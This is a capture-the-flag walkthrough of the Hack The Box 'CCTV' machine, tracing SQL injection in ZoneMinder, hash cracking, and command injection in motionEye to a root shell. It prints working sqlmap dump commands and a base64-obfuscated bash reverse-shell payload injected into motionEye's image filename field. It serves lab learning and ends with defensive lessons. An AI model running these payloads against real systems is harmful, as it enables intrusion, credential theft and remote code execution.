# HTB Write-Up: CCTV

| Field      | Details          |
|------------|------------------|
| Platform   | Hack The Box     |
| Difficulty | Easy             |
| OS         | Linux            |
| Author     | shreekara        |
| Date       | June 2, 2026    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web App & Version Fingerprinting](#2-enumeration--web-app--version-fingerprinting)
3. [Foothold — CVE-2024-51482 (ZoneMinder SQL Injection)](#3-foothold--cve-2024-51482-zoneminder-sql-injection)
4. [Lateral Movement — motionEye Internal Service](#4-lateral-movement--motioneye-internal-service)
5. [Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)](#5-privilege-escalation--cve-2025-60787-motioneye-command-injection)
6. [Summary & Takeaways](#6-summary--takeaways)

---

## 1. Reconnaissance

Starting as usual with a targeted port scan:

```bash
sudo nmap -sC -sV -p- 10.129.1.108
```
<img width="1283" height="931" alt="Screenshot 2026-06-21 193026" src="https://github.com/user-attachments/assets/179964dd-9abd-4d99-8276-f4a255adc20b" />

Two ports open:

| Port | Service | Details                 |
|------|---------|-------------------------|
| 22   | SSH     | OpenSSH 9.6p1 (Ubuntu)  |
| 80   | HTTP    | Apache 2.4.58 (Ubuntu)  |

SSH is useless without credentials. Port 80 immediately redirects to `http://cctv.htb/`, so that gets added to `/etc/hosts` and the web server is where to focus.

---

## 2. Enumeration — Web App & Version Fingerprinting

### 2.1 — Initial Browsing

Browsing `http://cctv.htb/` lands on a site for **SecureVision**, a CCTV and security solutions company. Two interactive elements on the page: a **Staff Login** button and a **Get a Quote** button.
<img width="1913" height="963" alt="Screenshot 2026-06-21 195054" src="https://github.com/user-attachments/assets/7c110087-95fd-4e99-88d6-50cd608366c0" />

Staff Login is the more interesting one. Clicking it brings up a **ZoneMinder** login panel.

### 2.2 — Default Credentials

Tried `admin:admin` — it worked. Inside the ZoneMinder dashboard.

The version string is visible immediately: **ZoneMinder v1.37.63**. That's the target.
<img width="1914" height="1004" alt="Screenshot 2026-06-21 195106" src="https://github.com/user-attachments/assets/33229d38-c0e0-4630-a630-fbee2508b3d0" />


### 2.3 — CVE Research

Searching for "ZoneMinder 1.37.63 CVE" turns up **CVE-2024-51482** — a boolean-based blind SQL injection in the `tid` parameter of `web/ajax/event.php`, affecting versions up to v1.37.64. Squarely in range.

| CVE            | Service    | Version    | Impact                                            | Severity |
|----------------|------------|------------|---------------------------------------------------|----------|
| CVE-2024-51482 | ZoneMinder | ≤ v1.37.64 | Authenticated blind SQL injection via `tid` param | High     |

---

## 3. Foothold — CVE-2024-51482 (ZoneMinder SQL Injection)

### 3.1 — How the Vulnerability Works

The `tid` (tag ID) parameter in ZoneMinder's event tag removal endpoint is injectable. It's a time-based blind SQLi — no visible output, just timing delays to infer data character by character.

### 3.2 — Manual Verification

There's a public PoC on GitHub but it didn't work cleanly, so I verified the endpoint manually first. Grabbed the `ZMSESSID` session cookie from the browser's dev tools storage tab and hit the endpoint directly:

```bash
curl -v -b "ZMSESSID=<cookie>" \
  "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1"
```

Response came back clean:

```json
{"result":"Ok","response":0}
```

Endpoint is reachable and authenticated. Good to proceed.

### 3.3 — Exploiting with sqlmap

With the endpoint confirmed, let sqlmap do the heavy lifting. Passing the session cookie and bumping up level and risk:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" --batch --level=3 --risk=3
```

sqlmap identified `tid` as time-based blind injectable:

```
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tid=1 AND (SELECT 5515 FROM (SELECT(SLEEP(5)))gYDX)
```

### 3.4 — Dumping Credentials

With injection confirmed, targeting the `zm.Users` table directly:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" --batch -D zm -T Users -C Username,Password --dump
```

> **Fair warning:** time-based blind injection is slow. Every character requires multiple timed requests. Sessions can expire mid-extraction — keep an eye on that cookie.

Three users extracted:

| Username   | Password (Bcrypt Hash)                                              |
|------------|---------------------------------------------------------------------|
| superadmin | `$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm`    |
| mark       | `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`    |
| admin      | `$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m`    |

### 3.5 — Hash Cracking

Bcrypt hashes (`$2y$10$` prefix). Threw them all into `hashes.txt` and ran hashcat:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

Two cracked:

| Username | Password   |
|----------|------------|
| mark     | opensesame |
| admin    | admin      |

### 3.6 — SSH Access

Checked if mark reuses his password for SSH:

```bash
ssh mark@10.129.244.156
# Password: opensesame
```
<img width="864" height="899" alt="Screenshot 2026-06-21 203525" src="https://github.com/user-attachments/assets/74956916-3c8a-4a2f-84da-58c73fae89b0" />

In as `mark`. The user flag isn't in `/home/mark/` though — it's sitting in `/home/sa_mark/`, which mark doesn't have access to. Need to pivot.

---

## 4. Lateral Movement — motionEye Internal Service

### 4.1 — Internal Enumeration

Checking what's listening internally:

```bash
ss -tlnp
```

Several ports not exposed externally. Curling them to fingerprint:

| Port | Service                       |
|------|-------------------------------|
| 8765 | motionEye 0.43.1b4 (CCTV UI) |
| 8888 | MediaMTX media server         |

Port 8765 is the interesting one — **motionEye**, an open-source CCTV management web UI.

### 4.2 — SSH Tunnel

It's only listening on localhost, so set up a tunnel to access it from the attack box:

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.244.156
```

Browsing `http://127.0.0.1:8765` brings up the motionEye login panel.

### 4.3 — Extracting Credentials

motionEye stores its config in `/etc/motioneye/`. Checked permissions — several files are readable:

```bash
ls -la /etc/motioneye/
strings /etc/motioneye/motion.conf | grep -i pass
```

Admin password stored in plaintext: `989c5a8ee87a0e9521ec81a79187d162109282f0`

Used that to log in as `admin`.

---

## 5. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)

### 5.1 — How the Vulnerability Works

The settings panel confirms **motionEye Version 0.43.1b4**. Searching for it turns up **CVE-2025-60787** — an OS command injection through the `image_file_name` configuration parameter.

motionEye passes the image filename through shell evaluation when saving snapshots. Injecting a command substitution like `$(...)` into the filename causes the shell to execute it. There's frontend JavaScript validation (`configUiValid`) blocking special characters, but that's trivially bypassed through the browser console.

| CVE            | Service   | Version   | Impact                                           | Severity |
|----------------|-----------|-----------|--------------------------------------------------|----------|
| CVE-2025-60787 | motionEye | 0.43.1b4  | Authenticated RCE via `image_file_name` parameter | High     |

### 5.2 — Setting Up the Listener

```bash
nc -lvnp 9001
```

### 5.3 — Bypassing Frontend Validation

Open the browser Developer Console (F12) and kill the validation function:

```javascript
configUiValid = function() { return true; };
```

This forces the UI validation to always return true, so any value gets accepted by the forms.

### 5.4 — Injecting the Payload

Navigate to **Settings → Still Images → Image File Name** and replace the default value with:

```
$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44My85MDAxIDA+JjE= | base64 -d | bash).%Y-%m-%d-%H-%M-%S
```

The base64 decodes to:

```bash
bash -i >& /dev/tcp/10.10.14.83/9001 0>&1
```

Base64 encoding dodges any remaining backend character filtering.

### 5.5 — Triggering the Shell

Save the configuration, then click the **snapshot button** on the camera feed. The moment motionEye tries to save the image using the malicious filename, the shell evaluates the `$(...)` substitution and the reverse shell fires.

motionEye runs as root — so the shell comes back as root directly. Both flags in one shot.

<img width="812" height="552" alt="Screenshot 2026-06-22 165942" src="https://github.com/user-attachments/assets/1ff6f68c-9957-413e-912b-579585ba6e11" />

---

## 6. Summary & Takeaways

### Attack Chain

| Phase                | Technique                                                          | Result                                       |
|----------------------|--------------------------------------------------------------------|----------------------------------------------|
| Recon                | `nmap -sC -sV -p-`                                                 | Ports 22, 80 identified                      |
| Web Enumeration      | Default creds `admin:admin` on ZoneMinder                          | Authenticated dashboard access               |
| CVE-2024-51482       | sqlmap time-based blind SQLi on `tid` → dump `zm.Users`            | Bcrypt hashes for mark, admin, superadmin    |
| Hash Cracking        | hashcat `-m 3200` against rockyou                                  | `mark:opensesame` cracked                    |
| SSH Access           | Password reuse                                                     | Shell as `mark`                              |
| Internal Enumeration | `ss -tlnp` + SSH tunnel to port 8765                               | motionEye identified + credentials extracted |
| CVE-2025-60787       | Command injection via `image_file_name` + JS validation bypass     | Reverse shell as root                        |

### What I Took Away From This Box

**Frontend validation is not security.** The motionEye UI blocked special characters client-side with a JavaScript function. One line in the browser console (`configUiValid = function() { return true; }`) and it was gone entirely. Backend validation is the only thing that counts — if the server doesn't sanitize input, the client-side check is just an inconvenience.

**Internal services are worth the extra effort.** motionEye wasn't exposed externally at all. Without running `ss -tlnp` and setting up the SSH tunnel, I'd have never reached it. Always enumerate internal ports after getting a foothold — the privesc path is often sitting right there on localhost.

**Default and plaintext credentials keep showing up.** ZoneMinder had `admin:admin`, and motionEye stored its admin password in plaintext in a world-readable config file. Both were trivially recoverable. Credential hygiene and proper file permissions would have broken this chain at two separate points.

**Authenticated RCE is still RCE.** CVE-2025-60787 requires login, so it might look lower risk on paper — but once you have credentials (which weren't hard to get here), the command injection runs as root with no further steps. The "authenticated" qualifier doesn't mean much when the credentials are sitting in a readable config file.
